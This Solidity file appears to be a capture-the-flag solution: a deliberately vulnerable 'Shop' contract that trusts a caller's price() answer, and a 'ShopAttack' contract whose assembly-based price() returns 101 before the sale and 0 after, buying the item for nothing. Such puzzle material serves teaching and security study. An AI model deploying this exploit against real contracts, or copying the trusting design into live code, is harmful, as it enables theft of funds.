// SPDX-License-Identifier: MIT
pragma solidity =0.6.12;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3300)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3300)();
    }
  }
}


contract ShopAttack is Buyer {


  function price() external view override returns (uint) {
      bool isSold = Shop(msg.sender).isSold();

      assembly {
        let result

        switch isSold
        case 1{
            result := 0
        }
        default {
            result := 101
        }
        mstore(0x0, result)
        return(0x0, 32)
    }
  }

    function attack(address _instance) external {
        Shop(_instance).buy();
    }
}